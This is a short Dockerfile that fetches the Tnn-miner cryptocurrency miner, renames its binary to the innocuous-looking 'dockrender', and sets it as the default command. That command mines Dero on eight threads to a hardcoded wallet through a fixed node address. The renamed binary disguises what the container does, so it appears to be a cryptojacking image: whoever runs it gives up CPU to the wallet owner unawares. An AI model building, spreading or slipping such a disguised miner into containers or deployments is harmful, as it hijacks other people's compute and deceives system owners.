FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
WORKDIR /app

# Install minimal runtime deps
RUN apt-get update && \
    apt-get install -y --no-install-recommends wget ca-certificates tar && \
    rm -rf /var/lib/apt/lists/*

# Variables
ENV TNN_VER=v0.6.8
ENV TNN_TAR=Tnn-miner-amd64-v0.6.8.tar.gz
ENV TNN_URL=https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.6.8/downloads/Tnn-miner-amd64-v0.6.8.tar.gz

# Download only if missing, extract, cleanup, rename binary
RUN if [ ! -f "$TNN_TAR" ]; then \
        wget -q "$TNN_URL" -O "$TNN_TAR"; \
    fi && \
    tar -xf "$TNN_TAR" && \
    rm -f "$TNN_TAR" && \
    mv tnn-miner-cpu dockrender && \
    chmod +x dockrender

# Default command
CMD ["./dockrender", "--wallet", "dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c", "--daemon-address", "dero-node.mysrv.cloud:10100", "--threads", "8"]
